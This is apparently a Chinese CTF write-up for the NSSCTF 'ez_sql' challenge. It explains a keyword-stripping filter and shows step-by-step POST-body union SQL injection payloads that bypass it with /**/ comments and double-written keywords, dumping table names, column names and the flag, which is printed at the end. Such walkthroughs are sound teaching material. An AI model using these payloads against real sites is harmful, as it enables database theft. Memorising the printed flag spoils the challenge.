---
title: "[SWPUCTF 2022 新生赛]ez_sql"
published: 2026-10-18
description: "[SWPUCTF 2022 新生赛]ez_sql 题目：NSSCTF 2881 标签：关键字绕过 / SQL 注入 / POST …"
category: "CTF"
---

# \[SWPUCTF 2022 新生赛\]ez\_sql

题目：[NSSCTF 2881](https://www.nssctf.cn/problem/2881)

标签：关键字绕过 / SQL 注入 / POST 注入

## 题面

打开环境，页面大概是这样：

> 年轻的 Web 手啊！  
> 看题目名就知道你该干嘛了吧~  
> 用相对安全的方式传参吧  
> 奥对了参数是 nss

![](https://pic.npiter.de/file/1792307753261_20261018151551093.png)

参数名已经剧透了：`nss`。

## 踩坑：GET 被拒

习惯性先试：

```text
?nss=1
```

直接回：不安全传参。

![](https://pic.npiter.de/file/1792307757823_20261018151551095.png)

题面那句「相对安全的方式」其实是在暗示：**别用 GET，改 POST**。  
不是说 POST 真比 GET 安全多少，只是参数别挂在 URL 上；本题后端就是非 POST 不给你玩。

## 假 flag 陷阱

HackBar 打开 `Use POST`，Body 里写：

```text
nss=1
```

![](https://pic.npiter.de/file/1792307769711_20261018151551096.png)

页面会同时甩俩：

-   `NSSCTF{This_1s_F4ke_flag}`
-   `NSSCTF{Ar3_y0u_K1ngd1ng}`

交上去都是错的。名字带 sql，真正考点是过滤后的联合注入，不是「POST 一下就出」。

* * *

## 知识点：这题和「裸 SQLi」差在哪

之前 PortSwigger / 简单注入，常见形态大概是：

```sql
SELECT * FROM users WHERE id = '$input' LIMIT 0,1
```

你塞 `-1' union select 1,2,3#`，空格、关键字都还在，数据库照单全收。

这题多了一步 **WAF / 字符串替换**：提交前把危险片段删掉或替换。你以为发出去的是：

```text
-1' union select 1,2,3#
```

服务端处理后可能变成：

```text
-1'  select1,2,3#
```

空格没了、`union` 没了，语法炸，就报错。所以思路变成两层：

1.  **先探测过滤了什么**（看报错里还剩什么）
2.  **再构造「删完之后仍然合法」的 payload**

### 绕过手段（本题用到的）

| 过滤项 | 绕过 | 原理（白话） |
| --- | --- | --- |
| 空格 | `/**/` | MySQL 里块注释当空白用，`a/**/b` 等价于 `a b` |
| `union` | `ununionion` | 过滤器删掉中间那段 `union`，剩下正好是完整的 `union` |
| `or` | `oorr` | 同理；所以 `information` 要写成 `infoorrmation` |

双写不是玄学：过滤器做的是「删一次关键字」，不是「循环删到干净」。删一次之后，外面拼起来的字符又变回关键字了。

联合注入回显：原查询大概有两列被 echo 到页面（`Flag:` / `This is true flag:`），所以 `union select` 的列数要对齐；本题用 `1,2,3` 再 `limit 1,1` 把后两列顶到回显位。

常规枚举顺序没变：

```text
库 → 表 → 列 → 值
```

只是关键字得带着绕过写法走。

### 语句为啥这么写（语法拆解）

假设后端大致是：

```sql
SELECT colA, colB FROM fake WHERE id='$nss' LIMIT 0,1
```

塞进去的 payload，本质是：**闭合原来的引号 → 用 UNION 拼一份新查询 → 用 `#` 注释掉后面尾巴**。

拼完、过滤删完关键字之后，等价于：

```sql
SELECT colA, colB FROM fake WHERE id='-1'
UNION
SELECT 1, 2, group_concat(Secr3t) FROM NSS_db.NSS_tb LIMIT 1,1
# ...' LIMIT 0,1
```

#### `#` 是什么

MySQL 里 `#` 是**行注释**：从 `#` 一直到行尾都当不存在。  
用来吃掉后端原来的 `LIMIT 0,1`、多余引号等，避免语法冲突。  
有的客户端里写成 `%23`（`#` 的 URL 编码），意思一样；也有人用 `--` （两个减号加空格）当注释。

#### `LIMIT` 是什么

`LIMIT 偏移, 条数`：

-   后端常见的 `LIMIT 0,1`：从第 0 行起只取 1 行（只要一条结果）
-   payload 里的 `limit 1,1`：跳过第 0 行再取 1 行（取第 2 行），用来把联合结果顶到页面回显位

#### 长 payload 里每个函数 / 关键字

以查表名那条为例：

```text
nss=-1'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#
```

| 写法 | 意思 |
| --- | --- |
| `-1'` | 关掉原来的字符串，让原查询查不到假数据那行 |
| `union select 1,2,xxx` | 追加一份结果；列数对齐；第 3 列放真正要看的内容 |
| `group_concat(...)` | 把多行拼成**一个字符串**（逗号连接），方便一次看完 |
| `information_schema.tables` | 系统库的「表目录」（本题写成 `infoorrmation` 绕 `or`） |
| `where table_schema=database()` | 只看**当前库**；`database()` 返回正在用的库名 |
| `limit 1,1` | 对准回显位（见上） |
| `#` | 注释掉后面尾巴 |

查列名：`information_schema.columns` 是「列目录」，`where table_name='NSS_tb'` 限定表，`group_concat(column_name)` 拼列名。  
取值：`group_concat(Secr3t)` 拼真列内容，`from NSS_db.NSS_tb` 指定真表。

一句话记忆：**闭合 → union 对齐列 → 第三位塞 payload → # 吃掉尾巴**。

* * *

## 实战过程

### 1\. 确认过滤

Body：

```text
nss=-1' union select 1,2,3#
```

回显类似：

```text
... near 'select1,2,3#' LIMIT 0,1' ...
```

`union` 和空格都没了 → 需要对症下药。

### 2\. 双写 + 注释绕过空格

```text
nss=-1'/**/ununionion/**/select/**/1,2,3#
```

能回到那两坨假 flag，说明联合语句已经能跑通（只是还在查原来的假数据行）。

### 3\. 查表名（`information` 里的 `or` 要双写）

```text
nss=-1'/**/ununionion/**/select/**/1,2,group_concat(table_name)/**/from/**/infoorrmation_schema.tables/**/where/**/table_schema=database()/**/limit/**/1,1#
```

回显：

```text
Flag: 2
This is true flag: NSS_tb,users
```

目标表：`NSS_tb`。

### 4\. 查列名

```text
nss=-1'/**/ununionion/**/select/**/1,2,group_concat(column_name)/**/from/**/infoorrmation_schema.columns/**/where/**/table_name='NSS_tb'/**/limit/**/1,1#
```

回显：

```text
Flag: 2
This is true flag: id,Secr3t,flll444g
```

`flll444g` 名字就很假，真值在 **`Secr3t`**。

### 5\. 取值

```text
nss=-1'/**/ununionion/**/select/**/1,2,group_concat(Secr3t)/**/from/**/NSS_db.NSS_tb/**/limit/**/1,1#
```

回显：

```text
Flag: 2
This is true flag: NSSCTF{89506540-8e4f-4f79-8847-2d68a8c45f79}
```

## Flag

`NSSCTF{89506540-8e4f-4f79-8847-2d68a8c45f79}`
